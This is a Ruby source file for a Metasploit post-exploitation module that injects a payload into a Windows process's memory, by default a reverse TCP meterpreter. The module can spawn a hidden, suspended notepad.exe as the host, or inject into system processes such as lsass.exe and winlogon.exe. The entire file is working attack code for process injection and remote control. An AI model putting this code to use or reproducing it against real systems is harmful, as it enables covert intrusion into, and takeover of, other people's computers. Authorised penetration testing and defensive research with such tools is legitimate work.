##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'


class MetasploitModule < Msf::Exploit::Local
  Rank                  = ExcellentRanking
  DEFAULT_ADMIN_TARGETS = ['services.exe', 'svchost.exe', 'lsass.exe', 'lsm.exe', 'winlogon.exe', 'wininit.exe', 'svchost.exe',]
  DEFAULT_USER_TARGETS  = ['explorer.exe']
  include Msf::Post::Windows::Process


  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Manage Memory Payload Injection',
                      'Description'    => %q{
          This module will inject a payload into memory of a process.  If a payload
        isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID
        datastore option isn't specified, then it'll inject into notepad.exe instead.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         =>
                              [
                                      'viper',
                              ],
                      'Platform'       => ['win'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'SessionTypes'   => ['meterpreter'],
                      'Targets'        => [['Windows', {}]],
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => "20190323"
          ))

    register_options(
            [
                    OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload.']),
                    OptBool.new('NEWPROCESS', [false, 'New notepad.exe to inject to', false]),
                    OptBool.new('SYSTEMTARGETS', [false, 'try to inject payload to system deault process', false])
            ])
    register_advanced_options(
            [
                    OptString.new('PROCESSPATH', [false, 'Process to spawn']),
            ]
    )
  end

  # Run Method for when run command is issued
  def exploit

    if session.type == "shell"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"

      pub_json_result(false,
                      'do not support linux',
                      nil,
                      self.uuid)
      return
    end


    @payload_name      = datastore['PAYLOAD']
    @payload_arch      = framework.payloads.create(@payload_name).arch
    @original_pid      = client.sys.process.open.pid
    @original_name     = client.sys.process.open.name.downcase
    @session_processes = []
    @session_processes = client.sys.process.processes

    if datastore['SYSTEMTARGETS']
      admin_targets = DEFAULT_ADMIN_TARGETS.dup
      admin_targets.map!(&:downcase)
      if admin_targets.include? @original_name
        vprint_good("Session is already in target process: #{@original_name}.")

        pub_json_result(true,
                        nil,
                        {:pid => @original_pid, :pname => @original_name},
                        self.uuid)
        return
      end

      admin_targets.each do |target_name|
        target_pid = get_pid_by_name(target_name)
        if target_pid
          flag, msg = inject_payload_to_pid(target_pid)
        end
        if flag
          pub_json_result(true,
                          nil,
                          {:pid => target_pid, :pname => target_name},
                          self.uuid)
          return
        end
      end
      pub_json_result(false,
                      'can not inject payload to any system process',
                      nil,
                      self.uuid)
      return
    end


    pid = get_pid
    if not pid
      pub_json_result(false,
                      'Unable to get a proper PID',
                      nil,
                      self.uuid)

      return
    end

    unless datastore['NEWPROCESS']
      unless arch_check(pid)
        pub_json_result(false,
                        'arch check failed',
                        nil,
                        self.uuid)
      end
    end

    inject_into_pid(pid)
  end

  # Figures out which PID to inject to
  def get_pid
    pid = datastore['PID']
    if datastore['NEWPROCESS'] or pid == 0
      pid = create_temp_proc
      return pid
    end

    unless has_pid?(pid)
      pid = create_temp_proc
      return pid
    end
    return pid
  end


  # Determines if a PID actually exists
  def has_pid?(pid)
    procs = []
    begin
      procs = client.sys.process.processes
    rescue Rex::Post::Meterpreter::RequestError
      vprint_error("Unable to enumerate processes")
      return false
    end

    procs.each do |p|
      found_pid = p['pid']
      return true if found_pid == pid
    end

    vprint_error("PID #{pid.to_s} does not actually exist.")

    return false
  end

  def get_pid_by_name(pname)

    @session_processes.each do |p|
      if pname == p['name']
        return p['pid']
      end
    end
    return false
  end


  # Checks the Architeture of a Payload and PID are compatible
  # Returns true if they are false if they are not
  def arch_check(pid)
    vprint_status("Performing Architecture Check")
    # get the pid arch
    client.sys.process.processes.each do |p|
      # Check Payload Arch
      if pid == p["pid"]
        vprint_status("Process found checking Architecture")
        if @payload_arch.first == p['arch']
          vprint_good("Process is the same architecture as the payload")
          return true
        else
          vprint_error("The PID #{ p['arch']} and Payload #{@payload_arch.first} architectures are different.")
          return false
        end
      end
    end
  end

  # Creates a temp notepad.exe to inject payload in to given the payload
  # Returns process PID
  def create_temp_proc()

    if datastore["PROCESSPATH"] != nil
      cmd = datastore["PROCESSPATH"]
    else
      windir = client.sys.config.getenv('windir')
      # Select path of executable to run depending the architecture
      if @payload_arch.first == ARCH_X86 and client.arch == ARCH_X86
        cmd = "#{windir}\\System32\\notepad.exe"
      elsif @payload_arch.first == ARCH_X64 and client.arch == ARCH_X64
        cmd = "#{windir}\\System32\\notepad.exe"
      elsif @payload_arch.first == ARCH_X64 and client.arch == ARCH_X86
        cmd = "#{windir}\\Sysnative\\notepad.exe"
      elsif @payload_arch.first == ARCH_X86 and client.arch == ARCH_X64
        cmd = "#{windir}\\SysWOW64\\notepad.exe"
      end
    end

    begin
      proc = client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Suspended' => true})
    rescue Rex::Post::Meterpreter::RequestError
      return nil
    end

    return proc.pid
  end

  def inject_payload_to_pid(pid)
    begin
      vprint_status("Preparing '#{@payload_name}' for PID #{pid}")
      raw    = payload.encoded
      thread = execute_shellcode(raw, nil, pid)
      unless thread
        return false, 'create new thread failed'
      end
      return true, ''
    rescue Rex::Post::Meterpreter::RequestError => e
      return false, e
    end
  end


  def inject_into_pid(pid)

    begin
      vprint_status("Preparing '#{@payload_name}' for PID #{pid}")
      raw    = payload.encoded
      thread = execute_shellcode(raw, nil, pid)
      unless thread

        pub_json_result(false,
                        'create new thread failed',
                        nil,
                        self.uuid)

      end
      pub_json_result(true,
                      nil,
                      {:pid => pid, :pname => nil},
                      self.uuid)
    rescue Rex::Post::Meterpreter::RequestError => e
      pub_json_result(false,
                      e,
                      nil,
                      self.uuid)
    end
  end
end
